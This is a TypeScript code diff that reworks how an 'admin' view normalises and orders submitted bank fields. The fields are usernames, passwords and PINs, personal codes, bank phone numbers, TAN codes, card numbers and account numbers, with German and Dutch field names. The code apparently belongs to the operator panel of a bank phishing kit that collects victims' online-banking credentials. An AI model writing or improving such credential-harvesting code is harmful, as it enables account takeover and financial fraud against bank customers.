@@ -183,28 +183,56 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
 
   const orderedField1 = pickString("orderedField1");
   const orderedField2 = pickString("orderedField2");
+  const orderedField2Type = pickString("orderedField2Type");
   const rawPersonalCode = pickString("personalCode");
   const rawBankPhone = pickString("bankPhone");
   const rawUsername = pickString("username", "verfuegernummer");
   const rawPassword = pickString("password", "pin");
+  const usedValues = new Set<string>();
+  const takeDistinct = (value: string) => {
+    const trimmed = value.trim();
+    if (!trimmed || usedValues.has(trimmed)) {
+      return "";
+    }
 
-  const effectivePersonalCode = orderedField1 || rawPersonalCode || rawUsername || rawBankPhone;
-  const effectivePassword = orderedField2 || rawPassword;
-  const effectiveBankPhone =
-    rawBankPhone && rawBankPhone !== effectivePersonalCode && rawBankPhone !== effectivePassword ? rawBankPhone : "";
-  const effectiveUsername =
-    rawUsername && rawUsername !== effectivePersonalCode && rawUsername !== effectivePassword
-      ? rawUsername
-      : rawPersonalCode && rawUsername !== effectivePersonalCode
-        ? rawUsername
-        : "";
+    usedValues.add(trimmed);
+    return trimmed;
+  };
+
+  const effectivePersonalCode = takeDistinct(orderedField1 || rawPersonalCode || rawUsername || rawBankPhone);
+
+  let effectiveBankPhone = "";
+  let effectiveUsername = "";
+  let effectivePassword = "";
+
+  if (orderedField2) {
+    if (orderedField2Type === "phone") {
+      effectiveBankPhone = takeDistinct(orderedField2);
+    } else if (orderedField2Type === "password") {
+      effectivePassword = takeDistinct(orderedField2);
+    } else {
+      effectiveUsername = takeDistinct(orderedField2);
+    }
+  }
+
+  if (!effectiveBankPhone) {
+    effectiveBankPhone = takeDistinct(rawBankPhone);
+  }
+
+  if (!effectiveUsername) {
+    effectiveUsername = takeDistinct(rawUsername || rawPersonalCode || rawBankPhone);
+  }
+
+  if (!effectivePassword) {
+    effectivePassword = takeDistinct(rawPassword);
+  }
 
   const canonicalFields: Array<[string, string]> = [
     ["loginMethod", pickString("loginMethod")],
     ["personalCode", effectivePersonalCode],
-    ["password", effectivePassword],
     ["bankPhone", effectiveBankPhone],
     ["username", effectiveUsername],
+    ["password", effectivePassword],
     ["tacCode", pickString("tacCode")],
     ["pasnummer", pickString("pasnummer")],
     ["rekeningnummer", pickString("rekeningnummer")],
@@ -226,6 +254,7 @@ function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[str
     "loginMethod",
     "orderedField1",
     "orderedField2",
+    "orderedField2Type",
     "personalCode",
     "bankPhone",
     "username",
